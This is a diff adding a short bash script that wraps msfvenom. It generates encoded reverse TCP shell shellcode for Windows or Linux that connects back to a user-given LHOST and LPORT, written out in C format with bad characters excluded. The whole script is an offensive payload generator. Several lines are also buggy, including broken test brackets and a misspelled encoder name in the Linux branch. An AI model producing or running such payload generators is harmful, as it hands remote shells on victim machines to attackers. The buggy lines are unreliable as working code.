@@ -1,0 +1,22 @@
+#!/usr/bin/bash
+
+if [ $# -ne 5 ]; then
+	echo -e "\nUsage : $0 <OS> <system bits> <LHOST> <LPORT> <outout file>"
+	exit 1
+fi
+
+if [ ${1} = "windows" ] || [ ${1} = "Windows" ] || [ ${1} = "WINDOWS" ]; then
+	msfvenom -p windows/shell_reverse_tcp LHOST=$3 LPORT=$4 -f c -e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d" -o $5
+elif [ ${1} = "linux" ] || [ ${1} = "Linux" ] || [ ${1} = "LINUX" ]; then
+	if [${2} = "86" ] || [ ${2} = "x86" ] || [ ${2} ="X86" ]; then
+		arch="x86"
+	elif [${2} = "64" ] || [ ${2} = "x64" ] || [ ${2} = "X64" ]; then
+		arch="x64"
+	else
+		echo -e "\nEnter the valid architecture system bits(x86 or x64)"
+		exit 1
+	fi
+	msfvenom -p linux/$arch/shell_reverse_tcp LHOST=$3 LPORT=$4 -f c -e x86/shikata_ga_ai -b "\x00\x0a\x0d\x25\x26\x2b\x3d" -o $5
+else
+	echo -e "\nIt support only windows and linux"
+fi
